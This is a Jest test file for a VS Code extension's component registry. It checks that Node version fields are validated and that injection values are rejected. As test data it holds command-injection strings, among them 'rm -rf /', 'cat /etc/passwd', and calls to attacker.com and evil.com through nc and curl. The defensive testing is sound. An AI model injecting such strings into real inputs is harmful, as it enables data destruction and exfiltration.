/**
 * ComponentRegistryManager - Validation Tests
 *
 * Tests node version security validation for all component types.
 */

// Mock ConfigurationLoader - MUST be before imports
jest.mock('@/core/config/ConfigurationLoader', () => {
    return {
        ConfigurationLoader: jest.fn().mockImplementation(() => {
            return {
                load: jest.fn(),
            };
        }),
    };
});

// Mock vscode
jest.mock('vscode', () => ({
    workspace: {
        getConfiguration: jest.fn(() => ({
            get: jest.fn((key: string, defaultValue: number) => defaultValue),
        })),
    },
}), { virtual: true });

import { ComponentRegistryManager } from '@/features/components/services/ComponentRegistryManager';
import { mockRawRegistry, createMaliciousRegistry } from './ComponentRegistryManager.testUtils';

describe('ComponentRegistryManager - Node Version Security Validation', () => {
    let manager: ComponentRegistryManager;
    let mockLoader: any;

    beforeEach(() => {
        jest.clearAllMocks();
        manager = new ComponentRegistryManager('/fake/extension/path');

        // Get the mock loader instance (must be after manager creation)
        const { ConfigurationLoader } = require('@/core/config/ConfigurationLoader');
        mockLoader = ConfigurationLoader.mock.results[0]?.value;
    });

    describe('getRequiredNodeVersions - security validation', () => {
        it('should accept valid numeric versions from components.json', async () => {
            // Given: components.json has valid numeric versions
            mockLoader.load.mockResolvedValue(mockRawRegistry);

            // When: getRequiredNodeVersions() is called
            const versions = await manager.getRequiredNodeVersions(
                'eds',                    // No nodeVersion (remote service)
                'adobe-commerce-paas',    // No nodeVersion (remote service)
                ['demo-inspector'],       // Node 18
                undefined,
                ['integration-service']   // Node 22
            );

            // Then: Versions from dependencies and app builder returned
            expect(versions.size).toBe(2);
            expect(versions.has('18')).toBe(true);  // demo-inspector
            expect(versions.has('22')).toBe(true);  // integration-service
        });

        it('should accept valid semantic versions', async () => {
            // Given: Component with semantic version
            const registryWithSemver = {
                ...mockRawRegistry,
                frontends: {
                    ...mockRawRegistry.frontends,
                    eds: {
                        ...mockRawRegistry.frontends!.eds,
                        configuration: {
                            ...mockRawRegistry.frontends!.eds.configuration,
                            nodeVersion: '20.11.0'
                        }
                    }
                }
            };
            mockLoader.load.mockResolvedValue(registryWithSemver);

            // When: getRequiredNodeVersions() is called
            const versions = await manager.getRequiredNodeVersions('eds');

            // Then: Semantic version accepted
            expect(versions.has('20.11.0')).toBe(true);
        });

        it('should throw error for injection payload in nodeVersion', async () => {
            // Given: components.json manually edited with malicious version
            const maliciousRegistry = createMaliciousRegistry('frontends.eds', '20; rm -rf /');
            mockLoader.load.mockResolvedValue(maliciousRegistry);

            // When & Then: Validation error thrown
            await expect(
                manager.getRequiredNodeVersions('eds')
            ).rejects.toThrow(/Invalid Node/);
        });

        it('should throw error for invalid version format with v prefix', async () => {
            // Given: Component with "v" prefix (invalid)
            const invalidRegistry = createMaliciousRegistry('frontends.eds', 'v20');
            mockLoader.load.mockResolvedValue(invalidRegistry);

            // When & Then: Validation error thrown
            await expect(
                manager.getRequiredNodeVersions('eds')
            ).rejects.toThrow(/Invalid Node/);
        });

        it('should throw error for invalid version format "latest"', async () => {
            // Given: Component with "latest" keyword (invalid - not in allowlist)
            const invalidRegistry = createMaliciousRegistry('frontends.eds', 'latest');
            mockLoader.load.mockResolvedValue(invalidRegistry);

            // When & Then: Validation error thrown
            await expect(
                manager.getRequiredNodeVersions('eds')
            ).rejects.toThrow(/Invalid Node/);
        });

        it('should validate all 9 injection payloads', async () => {
            // Given: All known injection payloads from security agent
            const injectionPayloads = [
                '20; rm -rf /',
                '20 && cat /etc/passwd',
                '20 | nc attacker.com 1234',
                '20`whoami`',
                '20$(id)',
                "20' OR '1'='1",
                '20\nrm -rf /',
                '20;$(curl evil.com)',
                '20 & curl http://evil.com',
            ];

            // When & Then: Each payload rejected
            for (const payload of injectionPayloads) {
                const maliciousRegistry = createMaliciousRegistry('frontends.eds', payload);
                mockLoader.load.mockResolvedValue(maliciousRegistry);

                await expect(
                    manager.getRequiredNodeVersions('eds')
                ).rejects.toThrow(/Invalid Node/);
            }
        });

        it('should validate nodeVersion in backend component', async () => {
            // Given: Backend with malicious version
            const maliciousRegistry = createMaliciousRegistry('backends.adobe-commerce-paas', '20; rm -rf /');
            mockLoader.load.mockResolvedValue(maliciousRegistry);

            // When & Then: Validation error thrown
            await expect(
                manager.getRequiredNodeVersions(undefined, 'adobe-commerce-paas')
            ).rejects.toThrow(/Invalid Node/);
        });

        it('should validate nodeVersion in dependencies', async () => {
            // Given: Dependency with malicious version (demo-inspector has no nodeVersion, add one)
            const maliciousRegistry = {
                ...mockRawRegistry,
                dependencies: {
                    ...mockRawRegistry.dependencies,
                    'demo-inspector': {
                        ...mockRawRegistry.dependencies!['demo-inspector'],
                        configuration: {
                            nodeVersion: '20; rm -rf /'
                        }
                    }
                }
            };
            mockLoader.load.mockResolvedValue(maliciousRegistry);

            // When & Then: Validation error thrown
            await expect(
                manager.getRequiredNodeVersions(undefined, undefined, ['demo-inspector'])
            ).rejects.toThrow(/Invalid Node/);
        });

        it('should validate nodeVersion in app builder components', async () => {
            // Given: App Builder with malicious version
            const maliciousRegistry = createMaliciousRegistry('appBuilderApps.integration-service', '20; rm -rf /');
            mockLoader.load.mockResolvedValue(maliciousRegistry);

            // When & Then: Validation error thrown
            await expect(
                manager.getRequiredNodeVersions(undefined, undefined, undefined, undefined, ['integration-service'])
            ).rejects.toThrow(/Invalid Node/);
        });
    });

    describe('getNodeVersionToComponentMapping - security validation', () => {
        it('should validate versions in infrastructure components', async () => {
            // Given: Infrastructure with malicious version
            const maliciousRegistry = createMaliciousRegistry('infrastructure.adobe-cli', '20; rm -rf /');
            mockLoader.load.mockResolvedValue(maliciousRegistry);

            // When & Then: Validation error thrown
            await expect(
                manager.getNodeVersionToComponentMapping()
            ).rejects.toThrow(/Invalid Node/);
        });

        it('should validate versions in frontend mapping', async () => {
            // Given: Frontend with malicious version
            const maliciousRegistry = createMaliciousRegistry('frontends.eds', '20; rm -rf /');
            mockLoader.load.mockResolvedValue(maliciousRegistry);

            // When & Then: Validation error thrown
            await expect(
                manager.getNodeVersionToComponentMapping('eds')
            ).rejects.toThrow(/Invalid Node/);
        });

        it('should validate versions in backend mapping', async () => {
            // Given: Backend with malicious version
            const maliciousRegistry = createMaliciousRegistry('backends.adobe-commerce-paas', '20; rm -rf /');
            mockLoader.load.mockResolvedValue(maliciousRegistry);

            // When & Then: Validation error thrown
            await expect(
                manager.getNodeVersionToComponentMapping(undefined, 'adobe-commerce-paas')
            ).rejects.toThrow(/Invalid Node/);
        });

        it('should validate versions in dependencies mapping', async () => {
            // Given: Dependency with malicious version (demo-inspector has no nodeVersion, add one)
            const maliciousRegistry = {
                ...mockRawRegistry,
                dependencies: {
                    ...mockRawRegistry.dependencies,
                    'demo-inspector': {
                        ...mockRawRegistry.dependencies!['demo-inspector'],
                        configuration: {
                            nodeVersion: '20; rm -rf /'
                        }
                    }
                }
            };
            mockLoader.load.mockResolvedValue(maliciousRegistry);

            // When & Then: Validation error thrown
            await expect(
                manager.getNodeVersionToComponentMapping(undefined, undefined, ['demo-inspector'])
            ).rejects.toThrow(/Invalid Node/);
        });

        it('should validate versions in app builder mapping', async () => {
            // Given: App Builder with malicious version
            const maliciousRegistry = createMaliciousRegistry('appBuilderApps.integration-service', '20; rm -rf /');
            mockLoader.load.mockResolvedValue(maliciousRegistry);

            // When & Then: Validation error thrown
            await expect(
                manager.getNodeVersionToComponentMapping(undefined, undefined, undefined, undefined, ['integration-service'])
            ).rejects.toThrow(/Invalid Node/);
        });

        it('should accept valid versions in mapping', async () => {
            // Given: Registry with valid versions
            mockLoader.load.mockResolvedValue(mockRawRegistry);

            // When: getNodeVersionToComponentMapping() is called
            const mapping = await manager.getNodeVersionToComponentMapping(
                'eds',                    // No nodeVersion (remote service)
                'adobe-commerce-paas',    // No nodeVersion (remote service)
                ['demo-inspector'],       // Node 18
                undefined,
                ['integration-service']   // Node 22
            );

            // Then: Mapping returned without errors (only deps have Node versions)
            expect(Object.keys(mapping).length).toBe(2);
            expect(mapping['18']).toBeDefined();  // demo-inspector
            expect(mapping['22']).toBeDefined();  // integration-service
        });
    });
});
